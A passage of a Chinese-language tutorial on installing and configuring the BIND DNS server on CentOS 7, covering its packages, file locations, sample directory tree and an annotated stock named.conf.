<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">            :</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> which</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> resolves</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> names</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> addresses</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">a</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> resolver</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> library</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">            :</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (routines </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> applications</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> use</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> when</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> interfacing</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> with</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DNS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">); </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">and</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">            :</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tools</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> verifying</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> that</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DNS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> operating</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> properly.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>BIND是DNS协议的一种实现。BIND包含了一个DNS Server（服务名叫named）,用来解析主机名到ip地址；一个解析库；一些辅助工具，还有一个安全目录工具，分别属于下面几个包：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bind：包里主要包含：</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    named</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DNS服务</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    named-chkconfig（named.conf文件检查工具）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    named-checkzone(zone文件检车工具）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    rndc（本地和远程dns控制工具）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bind-libs：named</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DNS服务的库</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bind-utils：包含一系列辅助工具来测试</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    host</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    dig</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    nslookup</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    nsupdate</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bind-chroot：切根程序，用来切换默认目录到另外一个深层的安全的目录/var/named/chroot，类似于前面光盘进入救援模式的那种情况。</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>named 涉及的文件</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/etc/named.conf</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">              # bind主配置文件</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/etc/named.rfc1912.zones</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">     # 定义zone的文件</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/etc/rc.d/init.d/named</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">       # bind脚本文件</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/etc/rndc.conf</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">               # rndc配置文件</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/usr/sbin/named-checkconf</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 检测/etc/named.conf文件语法</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/usr/sbin/named-checkzone</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 检测zone和对应zone文件的语法</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/usr/sbin/rndc</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">               # 远程dns管理工具</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/usr/sbin/rndc-confgen</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">       # 生成rndc密钥</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/var/named/named.ca</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">          # 根解析库</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/var/named/named.localhost</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">   # 本地主机解析库</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/var/named/slaves</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">            # 从ns服务器文件夹</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以查看/usr/share/doc/bind-9.9.4/sample/下有各种例子可以参考：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@centos7 sample]#tree</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> etc</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">│</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   ├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> named.conf</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">│</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   └──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> named.rfc1912.zones</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">└──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> var</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    └──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> named</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        ├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> data</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        ├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> my.external.zone.db</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        ├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> my.internal.zone.db</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        ├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> named.ca</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        ├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> named.empty</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        ├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> named.localhost</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        ├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> named.loopback</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        └──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> slaves</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">            ├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> my.ddns.internal.zone.db</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">            └──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> my.slave.internal.zone.db</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>根据参考来配置各个文件。</p>
<h2>named主配置文件</h2>
<p>主配置文件/etc/named.conf包括：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">监听端口(listen-on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> port</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)和ip地址</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">服务作用范围（本机还是指定网段还是全网）（allow-query）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">递归还是迭代查询(recursion</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">根区域解析文件（zone），其他区域文件可以看到有个include</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> “/etc/named.rfc1912.zones”</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">，这下面保存了localhost的区域文件，如果新添加的，卸载这个zones文件里，里面指向了zone文件地址。然后每一个zone文件，是在/var/named下面。</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>下面是原配置文件的部分：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@centos7 named]#cat /etc/named.conf </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">options</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   listen-on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> port</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 53</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 127.0.0.1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; };</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">//</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ipv4监听端口和ip地址，默认只有本地的</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   listen-on-v6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> port</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 53</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ::1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; }; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">//</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ipv6的监听端口和ip地址</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   directory</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "/var/named"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   dump-file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "/var/named/data/cache_dump.db"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   statistics-file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "/var/named/data/named_stats.txt"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   memstatistics-file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "/var/named/data/named_mem_stats.txt"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   allow-query</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     {</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> localhost</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; };</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   /*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> If</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> you</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> are</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> building</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> an</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> AUTHORITATIVE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DNS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> server,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> do</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> NOT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> enable</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> recursion.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> If</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> you</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> are</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> building</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RECURSIVE</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (caching) DNS server, you need to enable </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      recursion.</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> If</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> your</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> recursive</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DNS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> has</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> public</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> you</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> MUST</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> enable</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> access</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      control</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> limit</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> queries</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> your</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> legitimate</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> users.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Failing</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> do</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> so</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> will</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      cause</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> your</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> become</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> part</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> large</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scale</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DNS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> amplification</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      attacks.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Implementing</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> BCP38</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> within</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> your</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> would</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> greatly</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      reduce</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> such</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> attack</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> surface</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   */</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   recursion</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> yes</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">//</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 递归还是迭代查询</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   dnssec-enable</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> yes</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">//</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dns安全扩展,可以改为no关闭</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   dnssec-validation</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> yes</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">//可以改为no关闭</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   /*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ISC</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DLV</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> key</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> *</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   bindkeys-file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "/etc/named.iscdlv.key"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   managed-keys-directory</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "/var/named/dynamic"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   pid-file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "/run/named/named.pid"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   session-keyfile</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "/run/named/session.key"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">};</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">logging</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        channel</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default_debug</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">                file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "data/named.run"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">                severity</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dynamic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        };</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">};</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">zone</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "."</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> //</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 定义zone文件，这里是定义的根域的文件位置</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">   type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hint</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "named.ca"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">};</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">include</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "/etc/named.rfc1912.zones"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">//</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 把named.rfc1912.zones文件包含进来</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">include</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "/etc/named.root.key"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">//</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 把/etc/named.root.key文件包含进来</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>下面贴出一个修改后的区域文件：</p>
